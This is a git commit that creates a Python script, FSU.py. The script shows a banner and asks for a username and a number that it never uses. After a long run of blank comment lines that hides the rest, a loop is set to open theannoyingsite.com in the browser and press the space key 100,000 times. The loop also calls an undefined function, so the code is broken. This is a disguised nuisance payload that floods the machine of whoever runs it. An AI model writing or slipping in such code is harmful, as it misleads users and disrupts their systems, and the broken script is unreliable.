2d5dbe528ff9e63ddbe509109616e0fedd7d6b88
ArkAngeL43 <87203697+ArkAngeL43@users.noreply.github.com>
2021-07-23 19:46:46 -0400

    Create FSU.py

---
+++ FSU.py
@@ -0,0 +1,111 @@
+import os 
+import sys 
+import time 
+import pynput 
+from pynput.mouse import Button, Controller
+
+
+os.system(' clear ')
+time.sleep(1)
+print(" =========================+")   
+print("   __| (_)_________   _   +")
+print("  / _` | |_  /_  / | | |  +")
+print(" | (_| | |/ / / /| |_| |  +")
+print("  \__,_|_/___/___|\__, |  +")
+print("                  |___/   +") 
+print(" =========================+")
+
+user = str(input(" whats the username ==> "))
+num = str(input("  whats the # ==>  "))
+time.sleep(1)
+os.system(' clear ')
+os.system(' [+] hope you enjoy [+] ')
+os.system(' clear ')
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#                                                                                                                                                                                       
+#
+#
+#
+#
+#
+#
+#
+#
+#
+
+
+##100000
+from pynput.keyboard import Key, Controller
+keyboard = Controller()
+for i in range(100000): # how many times this command will be executed 
+    os.system('open https://theannoyingsite.com')
+    keyboard.press(Key.space)
+    restart_program()
